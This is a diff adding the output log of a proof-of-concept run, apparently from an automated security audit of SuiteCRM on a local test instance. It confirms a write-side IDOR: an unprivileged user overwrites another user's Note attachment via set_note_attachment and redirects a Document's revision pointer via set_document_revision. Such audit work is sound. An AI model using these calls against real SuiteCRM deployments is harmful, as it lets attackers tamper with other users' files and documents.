@@ -1,0 +1,24 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-079/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-079/../.venv
+========================================================================
+VULN-079: set_note_attachment / set_document_revision write-side IDOR
+target: http://localhost:33116
+========================================================================
+[SETUP] admin web + legacy REST session; a completely ordinary low-priv user (no ACL setup at all)
+[OK] low-priv user mod_4dbb3a45 id=8c661ebf-b068-479c-b5ba-29505fbc403e -- zero special Role/ACL configured
+[STEP] PART A: admin creates a Note with an original attachment
+[INFO] admin set_note_attachment -> {'id': '6387cd56-ae24-4b8e-950c-4ad6ede69680'}
+[INFO] Note 6387cd56-ae24-4b8e-950c-4ad6ede69680 on-disk content BEFORE attack: b'ORIGINAL-OWNER-CONTENT-orig_64678735\n'
+[STEP] low-priv (no related_module_id/name -> pure session-only gate) overwrites Note 6387cd56-ae24-4b8e-950c-4ad6ede69680
+[INFO] low-priv set_note_attachment -> {'id': '6387cd56-ae24-4b8e-950c-4ad6ede69680'}
+[INFO] Note 6387cd56-ae24-4b8e-950c-4ad6ede69680 on-disk content AFTER attack: b'ATTACKER-OVERWRITE-atk_2cf4b670\n'
+[PROOF] Note attachment overwritten by an unrelated, unprivileged user = True (before=b'ORIGINAL-OWNER-CONTENT-orig_64678735\n', after=b'ATTACKER-OVERWRITE-atk_2cf4b670\n')
+[STEP] PART B: admin creates a Document with an original revision
+[OK] Document id=9b67caf2-b11a-4b51-b8ad-e8d55dfc59a7, original revision id=0d36bd9f-9124-4cfe-8c5a-b89a204c0529
+[INFO] documents.document_revision_id BEFORE attack: [{'document_revision_id': '0d36bd9f-9124-4cfe-8c5a-b89a204c0529'}]
+[STEP] low-priv (session-only gate, empty module) adds a new revision to Document 9b67caf2-b11a-4b51-b8ad-e8d55dfc59a7
+[INFO] low-priv set_document_revision -> {'id': 'e9d38da9-f066-42b9-afe5-5faa0d61163f'}
+[INFO] documents.document_revision_id AFTER attack: [{'document_revision_id': 'e9d38da9-f066-42b9-afe5-5faa0d61163f'}]
+[PROOF] Document's latest-revision pointer hijacked by an unrelated, unprivileged user = True (now points to e9d38da9-f066-42b9-afe5-5faa0d61163f, was 0d36bd9f-9124-4cfe-8c5a-b89a204c0529); planted bytes on disk match attacker payload = True
+[OK] Confirmed: a completely unprivileged, unrelated user overwrote another user's Note attachment AND hijacked a Document's latest-revision pointer to attacker-controlled content, with no ACL check on the target record in either path.
+==> VULN-079: CONFIRMED — Part A: Note 6387cd56-ae24-4b8e-950c-4ad6ede69680 attachment overwritten (b'ORIGINAL-OWNER-CONTE' -> b'ATTACKER-OVERWRITE-a'); Part B: Document 9b67caf2-b11a-4b51-b8ad-e8d55dfc59a7 latest-revision pointer hijacked to attacker revision e9d38da9-f066-42b9-afe5-5faa0d61163f (b'ORIGINAL-DOCUMENT-CO' -> b'ATTACKER-PLANTED-REV')
